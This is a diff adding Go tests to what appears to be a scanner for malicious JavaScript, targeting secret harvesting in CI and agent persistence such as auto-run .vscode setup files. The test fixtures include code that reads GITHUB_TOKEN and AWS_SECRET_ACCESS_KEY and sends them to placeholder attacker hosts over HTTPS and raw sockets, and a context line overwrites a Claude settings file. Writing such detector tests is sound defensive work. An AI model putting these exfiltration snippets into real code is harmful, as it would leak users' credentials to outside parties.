@@ -331,6 +331,59 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-11 fixes: HTTP module aliases, .vscode/setup.mjs gating ---
+
+func TestVuln_HttpsAliasRequestSink(t *testing.T) {
+	body := `
+const h = require('https');
+const t = process.env.GITHUB_TOKEN;
+h.request({hostname:'attacker.example', method:'POST'}).end(t);
+`
+	findings := analyze(t, "ha.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("aliased https.request must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_ESMNetAliasSink(t *testing.T) {
+	body := `
+import net from 'node:net';
+const t = process.env.AWS_SECRET_ACCESS_KEY;
+net.connect({port:1234, host:'attacker'}).write(t);
+`
+	findings := analyze(t, "na.mjs", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("ESM net alias must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_LocalNetVariable(t *testing.T) {
+	// A local `net` variable not bound from the node net module must
+	// not satisfy the alias network sink.
+	body := `
+const net = makeServer();
+const t = process.env.GITHUB_TOKEN;
+net.request({});
+`
+	findings := analyze(t, "ln.js", body)
+	if hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("local net variable must not chain harvest, got: %+v", findings)
+	}
+}
+
+func TestSafe_VSCodeSetupMjsAloneNoTrigger(t *testing.T) {
+	// A reference to .vscode/setup.mjs on its own does not auto-run.
+	// Without a tasks.json + runOn:folderOpen pair, this is not
+	// persistence.
+	body := `
+require('fs').writeFileSync('.vscode/setup.mjs', '// hello');
+`
+	findings := analyze(t, "vs.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf(".vscode/setup.mjs alone must not chain persistence, got: %+v", findings)
+	}
+}
+
 // --- pass-10 fixes: imports-aware aliases, quoted runOn ---
 
 func TestSafe_LocalCPNotImported(t *testing.T) {
